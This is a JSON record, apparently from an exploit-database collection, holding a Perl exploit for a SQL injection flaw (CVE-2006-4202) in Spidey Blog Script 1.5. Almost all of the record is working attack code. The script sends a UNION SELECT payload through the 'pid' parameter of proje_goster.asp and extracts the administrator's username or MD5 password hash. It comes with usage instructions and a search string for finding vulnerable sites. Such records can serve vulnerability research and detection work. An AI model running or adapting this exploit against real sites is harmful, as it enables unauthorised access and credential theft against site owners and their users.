{
  "id": "2421",
  "title": "Spidey Blog Script 1.5 - &#039;proje_goster.asp&#039; SQL Injection (2)",
  "cve": "CVE-2006-4202",
  "vuln_type": "sqli",
  "code": "#!usr/bin/perl\r\n\r\n#Author : gega\r\n#Google : \"Spidey Blog Script (c) v1.5\"\r\n#SpideyBlog 1.5 Sql Injection Exploit\r\n#Author Mail : gega.tr[at]gmail[dot]com\r\n#Powered by e-hack.org\r\n#Vulnerability by Asianeagle.\r\n#Vulnerability Link : http://milw0rm.com/exploits/2186\r\n\r\nuse LWP::Simple;\r\n\r\nprint \"\\n==============================\\n\";\r\nprint \"==      Spidey Blog v1.5    ==\\n\";\r\nprint \"==   Sql Injection Exploit  ==\\n\";\r\nprint \"==        Author : gega     ==\\n\";\r\nprint \"==============================\\n\\n\";\r\n\r\nif(!$ARGV[0] or !$ARGV[0]=~/http/ or !$ARGV[1] or ($ARGV[1] ne 'password' and $ARGV[1] ne 'nick'))\r\n{\r\n\tprint \"Usage : perl $0 [path] [function]\\n\";\r\n\tprint \"path ==> http://www.example.com/blog/\\n\";\r\n\tprint \"function ==> nick OR password\\n\";\r\n\tprint \"Example : perl $0 http://site.org/blog/ nick\\n\";\r\n\texit(0);\r\n}\r\nelse\r\n{\r\n\tif($ARGV[1] eq 'nick'){\r\n\t\t$url=q[proje_goster.asp?pid=-1%20union%20select%200,1,2,3,4,kullanici_adi,6%20from%20uyeler%20where%20id%20like%201];\r\n\t\t$page=get($ARGV[0].$url) || die \"[-] Unable to retrieve: $!\";\r\n\t\tprint \"[+] Connected to: $ARGV[0]\\n\";\r\n\t\t$page=~m/<td width=\"100%\" valign=\"top\" height=\"19\" colspan=\"3\"><span class=\"normal_yazi\">(.*?)<\\/span><\\/td>/ && print \"[+] Username of administrator is: $1\\n\";\r\n\t\tprint \"[-] Unable to retrieve username\\n\" if(!$1); }\r\n\telse {\r\n\t\t$code=q[proje_goster.asp?pid=-1%20union%20select%200,1,2,3,4,sifre,6%20from%20uyeler%20where%20id%20like%201];\r\n\t\t$page=get($ARGV[0].$code) || die \"[-]Unable to retrieve: $!\";\r\n\t\tprint \"[+] Connected to: $ARGV[0]\\n\";\r\n\t\t$page=~m/<td width=\"100%\" valign=\"top\" height=\"19\" colspan=\"3\"><span class=\"normal_yazi\">(.*?)<\\/span><\\/td>/ && print \"[+] MD5 hash of password is: $1\\n\";\r\n\t\tprint \"[-] Unable to retrieve password\\n\" if(!$1);\r\n\t}\r\n}\r\n \r\n#To Be Or Not To Be!\r\n\r\n# milw0rm.com [2006-09-24]",
  "url": "https://www.exploit-db.com/exploits/2421"
}